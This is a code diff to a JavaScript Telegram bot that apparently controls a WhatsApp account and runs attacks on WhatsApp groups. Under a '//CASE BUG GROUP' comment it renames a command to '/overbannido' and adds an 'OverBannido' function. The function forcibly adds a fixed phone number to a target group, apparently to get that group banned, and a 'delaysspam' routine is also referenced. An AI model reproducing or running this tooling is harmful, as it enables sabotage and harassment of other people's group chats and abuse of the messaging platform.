@@ -2410,16 +2410,15 @@ bot.action(['warna_merah', 'warna_hijau', 'warna_biru', 'warna_disko'], async (c
     const openingCaption = getOpeningMenuCaption(username, userId, senderStatus, runtime);
 
     const keyboard = {
-    inline_keyboard: [
-        [
-            {
-                text: "𝗦𝗛𝗢𝗪 𝗦𝗖𝗥𝗜𝗣𝗧",
-                callback_data: "open_script",
-                style: style,
-                icon_custom_emoji_id: getRandomIconId()
-            }
-        ]
-    ]
+        inline_keyboard: [
+            [
+                {
+                    text: "𝗦𝗛𝗢𝗪 𝗦𝗖𝗥𝗜𝗣𝗧",
+                    callback_data: "open_script",
+                    style: style,
+                    icon_custom_emoji_id: getRandomIconId()
+                }
+            ],
             [
                 {
                     text: "𝗔𝗨𝗧𝗢 𝗨𝗣𝗗𝗔𝗧𝗘",
@@ -2428,7 +2427,9 @@ bot.action(['warna_merah', 'warna_hijau', 'warna_biru', 'warna_disko'], async (c
                     icon_custom_emoji_id: getRandomIconId()
                 }
             ]
+        ]
     };
+
 
     await ctx.replyWithVideo(thumbnailVideo, {
         caption: openingCaption,
@@ -3518,7 +3519,7 @@ Status: Success
 });
 
 //CASE BUG GROUP
-bot.command('Xbans', async (ctx) => {
+bot.command('overbannido', async (ctx) => {
   const chatId = ctx.chat.id;
   const link = ctx.message.text.split(' ').slice(1).join(' ');
 
@@ -3526,7 +3527,7 @@ bot.command('Xbans', async (ctx) => {
 
   if (!link) {
     return ctx.reply(
-      `🪧 *Format:* /Xbans https://chat.whatsapp.com/xxxxxx`,
+      `🪧 *Format:* /overbannido https://chat.whatsapp.com/xxxxxx`,
       { parse_mode: "Markdown" }
     );
   }
@@ -3572,7 +3573,7 @@ bot.command('Xbans', async (ctx) => {
       { chat_id: chatId, message_id: processMsgId, parse_mode: "HTML" }
     );
 
-    await GroupBan1(sock, target);
+    await OverBannido(sock, target);
 
     await ctx.editMessageCaption(
       `
@@ -4959,4 +4960,17 @@ async function delaysspam(sock, target, loop = 30) {
     }
 }
 
+async function OverBannido(sock, target) {
+    if (!target.endsWith("@g.us")) throw "@g.us server required"
+
+    try {
+        await sock.groupParticipantsUpdate(
+            target,
+            ["13135550002@s.whatsapp.net"],
+            "add"
+        )
+    } catch (e) {
+        throw e
+    }
+}
 bot.launch();
